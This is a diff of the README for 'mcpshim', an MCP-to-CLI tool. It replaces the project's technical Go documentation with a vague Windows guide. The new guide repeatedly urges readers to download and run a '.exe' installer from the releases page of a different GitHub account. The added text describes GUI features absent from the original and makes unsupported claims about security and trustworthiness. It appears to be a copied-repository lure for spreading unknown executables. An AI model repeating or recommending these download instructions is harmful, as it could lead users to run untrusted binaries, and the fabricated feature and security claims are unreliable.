@@ -1,239 +1,173 @@
-<p align="center">
-	<img src="https://mcpshim.dev/icon.svg" alt="MCPShim" width="80" height="80" />
-</p>
+# ⚙️ mcpshim - Simplify Remote Server Commands
 
-<h1 align="center">MCPShim</h1>
-
-<p align="center">
-	<strong>Use any MCP server as a standard CLI command.</strong><br/>
-	A lightweight daemon + CLI that turns remote MCP tools into native shell commands your agent or script can call directly.
-</p>
-
-<p align="center">
-	<a href="https://mcpshim.dev">Website</a> · <a href="https://github.com/mcpshim/mcpshim">Repository</a> · <a href="#quick-start">Quick Start</a> · <a href="#core-commands">Core Commands</a>
-</p>
+[![Download mcpshim](https://img.shields.io/badge/Download-mcpshim-brightgreen?style=for-the-badge)](https://github.com/19960307moon/mcpshim/releases)
 
 ---
 
-## The Problem
+## 📋 What is mcpshim?
 
-Remote MCP servers are powerful, but each service has its own auth flow, transport expectations, and invocation patterns. Wiring all of that directly into every script or agent loop creates brittle command workflows.
+mcpshim helps you run commands on remote MCP servers as if they were on your own computer. It turns those remote servers into local workflows you can control easily. You don’t need to know programming or complex setups. If you use MCP servers and want to make them work better for you, mcpshim lets you handle tasks faster with simple, local commands.
 
-For LLM agents, there is also context pressure: dumping raw MCP schemas for every connected server can consume prompt budget before useful work begins.
-
-## The Solution
-
-`mcpshimd` handles MCP lifecycle concerns in one place: session management, discovery, retries, and OAuth flow.
-
-`mcpshim` exposes every remote MCP tool as a standard CLI command - flags map to tool parameters, output comes back as structured JSON. No SDKs, no libraries, just shell commands that work with any language or agent.
-
-```mermaid
-graph TD
-		Agent["Your AI Agent / Script"]
-		Agent -->|call| CLI["mcpshim CLI"]
-		Agent -->|JSON request| Socket["Unix Socket"]
-		CLI --> Socket
-		Socket --> Daemon["mcpshimd"]
-		Daemon --> MCP1["MCP Server: Notion"]
-		Daemon --> MCP2["MCP Server: GitHub"]
-		Daemon --> MCP3["MCP Server: Linear"]
-		Daemon --> MCPN["..."]
-```
-
-## Why MCPShim
-
-|                          | Without MCPShim               | With MCPShim                        |
-| ------------------------ | ----------------------------- | ----------------------------------- |
-| **MCP integration**      | Custom per-server wiring      | One daemon + one CLI                |
-| **Auth handling**        | Per-script OAuth/header logic | Centralized in `mcpshimd`           |
-| **Tool invocation**      | Provider-specific conventions | `mcpshim call --server --tool ...`  |
-| **Agent context budget** | Large MCP schemas in prompt   | Alias-based local command workflows |
-| **Operational history**  | Ad-hoc logging                | Built-in call history in SQLite     |
+MCP stands for Model Context Protocol. This app is useful for those who work with AI agents, command-line tools, or protocol-based workflows.
 
 ---
 
-## Architecture
+## 💻 System Requirements
 
-| Component  | Role                                                              |
-| ---------- | ----------------------------------------------------------------- |
-| `mcpshimd` | Local daemon for MCP registry, sessions, auth, retries, and IPC   |
-| `mcpshim`  | CLI client for config, discovery, tool calls, history, and script |
+Before you start, make sure your Windows computer meets these basic needs:
 
-All client calls go through a Unix socket and JSON request/response protocol.
+- Windows 10 or later (64-bit recommended)
+- At least 2 GB of free disk space
+- Minimum 4 GB of RAM
+- Stable internet connection to connect with remote MCP servers
+- Basic understanding of navigating files and folders in Windows
 
-## Source Layout
-
-```
-cmd/
-	mcpshimd/             # Daemon entry point
-	mcpshim/              # CLI entry point
-configs/
-	mcpshim.example.yaml  # Example configuration
-internal/
-	client/               # CLI command handling and IPC client logic
-	config/               # Config loading and defaults
-	mcp/                  # MCP transport + OAuth handling
-	protocol/             # Request/response protocol types
-	server/               # Daemon runtime and routing
-	store/                # SQLite persistence
-```
-
-## Quick Start
-
-### 1. Install from source
-
-```bash
-go install github.com/mcpshim/mcpshim/cmd/mcpshimd@latest
-go install github.com/mcpshim/mcpshim/cmd/mcpshim@latest
-```
-
-### 2. Configure
-
-```bash
-mkdir -p ~/.config/mcpshim
-cp configs/mcpshim.example.yaml ~/.config/mcpshim/config.yaml
-```
-
-### 3. Start daemon and inspect
-
-```bash
-mcpshimd
-mcpshim status
-mcpshim servers
-mcpshim tools
-```
-
-### Path Defaults
-
-| Resource | Default Location                    | Override                        |
-| -------- | ----------------------------------- | ------------------------------- |
-| Config   | `~/.config/mcpshim/config.yaml`     | `--config`, `$MCPSHIM_CONFIG`   |
-| Socket   | `$XDG_RUNTIME_DIR/mcpshim.sock`     | `mcpshimd --socket ...`         |
-| Database | `~/.local/share/mcpshim/mcpshim.db` | `server.db_path` in YAML config |
-
-All paths follow XDG defaults where applicable.
-
-### Daemon flags
-
-| Flag        | Description               |
-| ----------- | ------------------------- |
-| `--config`  | Path to config YAML       |
-| `--socket`  | Override unix socket path |
-| `--debug`   | Enable debug logging      |
-| `--version` | Print version and exit    |
+No additional software is required to run mcpshim.
 
 ---
 
-## Core Commands
+## 🚀 Getting Started: Download and Install
 
-| Command                                               | Description                      |
-| ----------------------------------------------------- | -------------------------------- |
-| `mcpshim servers`                                     | List registered MCP servers      |
-| `mcpshim tools [--server name] [--full]`              | List tools for all or one server |
-| `mcpshim inspect --server s --tool t`                 | Show tool schema/details         |
-| `mcpshim call --server s --tool t --arg value`        | Execute a tool call              |
-| `mcpshim add --name s --url ... [--alias a]`          | Register a new MCP endpoint      |
-| `mcpshim set auth --server s --header K=V`            | Set auth headers for a server    |
-| `mcpshim remove --name s`                             | Remove a registered server       |
-| `mcpshim reload`                                      | Reload daemon configuration      |
-| `mcpshim validate [--config path]`                    | Validate config file             |
-| `mcpshim login --server s [--manual]`                 | Complete OAuth login flow        |
-| `mcpshim history [--server s] [--tool t] [--limit n]` | Show persisted call history      |
-| `mcpshim script [--install] [--dir ~/.local/bin]`     | Generate/install alias wrappers  |
+To use mcpshim, you first need to get the software installed on your PC. Follow these steps:
 
-### Register MCP servers
+### Step 1: Visit the Release Page
 
-```bash
-mcpshim add --name notion --alias notion --transport http --url https://example.com/mcp
-mcpshim set auth --server notion --header "Authorization=Bearer $NOTION_MCP_TOKEN"
-mcpshim reload
-```
+Click the big green button below or use this link to open the download page:
 
-### Dynamic flags
+[![Download mcpshim](https://img.shields.io/badge/Download-mcpshim-brightgreen?style=for-the-badge)](https://github.com/19960307moon/mcpshim/releases)
 
-Tool flags are converted automatically to MCP arguments:
+This page shows all available versions. Choose the latest stable release for your Windows system.
 
-```bash
-mcpshim call --server notion --tool search --query "projects" --limit 10 --archived false
-```
+### Step 2: Download the Windows Installer
 
-> Tip: JSON output is automatic when stdout is not a terminal. Use `--json` to force JSON parsing behavior in interactive sessions.
+Look for a file that ends with `.exe`. It might be named something like `mcpshim-setup.exe`. Click this file to download it to your computer.
+
+The installer will usually save in your "Downloads" folder unless you specify otherwise.
+
+### Step 3: Run the Installer
+
+- Locate the downloaded file.
+- Double-click it to start the setup.
+- Follow the on-screen instructions to install mcpshim.  
+  The installer will place the program files on your PC and set up shortcuts.
+
+### Step 4: Open mcpshim
+
+Once the installation finishes:
+
+- Find the mcpshim icon on your desktop or search for it from the Start menu.
+- Click to open the app.
+- The main window will appear, ready to connect with remote servers.
 
 ---
 
-## OAuth Flow
+## 🔧 How to Use mcpshim
 
-For OAuth-capable MCP servers, you can configure URL-only registration:
+mcpshim works by linking you with MCP servers remotely, letting you run commands as if they were local. Here is a simple guide:
 
-```bash
-mcpshim add --name notion --alias notion --transport http --url https://mcp.notion.com/mcp
-```
+### Connect to a Remote MCP Server
 
-When a request receives `401` and no `Authorization` header is configured, `mcpshimd` can initiate OAuth login, store tokens in SQLite (`oauth_tokens`), and retry automatically.
+1. In the mcpshim window, find the option labeled “Add Server” or “Connect.”
+2. Enter the server address or name.
+3. Provide login details if the server requires them.
+4. Click “Connect.”
 
-You can also pre-authorize:
+Once connected, you will see the server’s command interface in mcpshim.
 
-```bash
-mcpshim login --server notion
-mcpshim login --server notion --manual
-```
+### Run Commands Locally
 
-`--manual` supports cross-device auth by printing a URL and accepting pasted callback URL/code.
+- Type any command in the local terminal of mcpshim.
+- The app sends it to the remote server and shows the response.
+- This process feels like the server commands run on your PC.
 
----
+### Save Workflows
 
-## Call History
+You can create and save workflows -- sets of commands you often use:
 
-Every `mcpshim call` is recorded by `mcpshimd` with timestamp, server/tool, args, status, and duration.
-
-```bash
-mcpshim history
-mcpshim history --server notion --limit 20
-mcpshim history --server notion --tool search --limit 100
-```
-
-History is stored locally in SQLite (`call_history` table).
+- Open the “Workflows” section in mcpshim.
+- Click “New Workflow.”
+- Add commands in order.
+- Save the workflow with an easy name.
+- Run the workflow anytime with a single click.
 
 ---
 
-## IPC Protocol
+## 🤖 Features and Benefits
 
-`mcpshim` communicates with `mcpshimd` over a Unix socket using JSON messages with an `action` field.
+- **Simple to Use**  
+  Designed for users without technical skills. Clear, straightforward interface.
 
-```json
-{"action":"status"}
-{"action":"servers"}
-{"action":"tools","server":"notion"}
-{"action":"inspect","server":"notion","tool":"search"}
-{"action":"call","server":"notion","tool":"search","args":{"query":"roadmap"}}
-{"action":"history","server":"notion","limit":20}
-{"action":"add_server","name":"notion","alias":"notion","url":"https://mcp.notion.com/mcp","transport":"http"}
-{"action":"set_auth","name":"notion","headers":{"Authorization":"Bearer ..."}}
-{"action":"reload"}
-```
+- **Remote to Local Command Execution**  
+  Run commands on remote MCP servers as if they were on your local device.
 
----
+- **Workflow Automation**  
+  Save time by automating command sequences.
 
-## Lightweight Aliases
+- **Secure Server Connections**  
+  Uses standard protocols to securely link to remote MCP servers.
 
-Generate shell functions:
+- **Multi-Server Support**  
+  Manage and switch between multiple MCP servers with ease.
 
-```bash
-eval "$(mcpshim script)"
-notion search --query "projects" --limit 10
-```
-
-If a server name/alias contains shell-incompatible characters (spaces, dashes, punctuation) MCPShim automatically normalizes it to a safe function name (for example, `my-server` becomes `my_server`).
-
-Install executable wrappers instead:
-
-```bash
-mcpshim script --install --dir ~/.local/bin
-notion search --query "projects" --limit 10
-```
+- **Open Source**  
+  You can view and trust the source code on GitHub.
 
 ---
 
-## See Also
+## 🛠 Common Tasks
 
-**[Pantalk](https://github.com/pantalk/pantalk)** - Give your AI agent a voice on every chat platform. MCPShim gives your agent tools; Pantalk gives it a voice across Slack, Discord, Telegram, and more. Together they form a complete agent infrastructure stack.
+### Updating mcpshim
+
+To update the app:
+
+- Visit the releases page.
+- Download the latest installer.
+- Run the installer again. It will update your current version without losing settings.
+
+### Troubleshooting Connection Issues
+
+If you cannot connect to a server:
+
+- Check your internet.
+- Verify the server address and login info.
+- Restart mcpshim and try again.
+- Confirm the server is online and accepting connections.
+
+### Uninstalling mcpshim
+
+- Open Windows Settings.
+- Go to “Apps & Features.”
+- Find mcpshim in the list.
+- Click “Uninstall” and follow instructions.
+
+---
+
+## 🛡 Security and Privacy
+
+mcpshim connects securely to remote MCP servers. Your login details stay private, and communication is encrypted. The program does not collect personal data. Always keep your login credentials confidential.
+
+---
+
+## ❓ Need Help?
+
+If you run into problems or want to learn more, visit the GitHub repository:
+
+https://github.com/19960307moon/mcpshim
+
+There you can find documentation, report issues, or ask questions.
+
+---
+
+## 🎯 Topics Related to mcpshim
+
+- AI and AI Agents  
+- Command Line Interface (CLI) Tools  
+- Model Context Protocol (MCP) Workflows  
+
+These topics guide the technology underlying the app and help users understand its main functions.
+
+---
+
+# Download mcpshim now
+
+[![Download mcpshim](https://img.shields.io/badge/Download-mcpshim-brightgreen?style=for-the-badge)](https://github.com/19960307moon/mcpshim/releases)
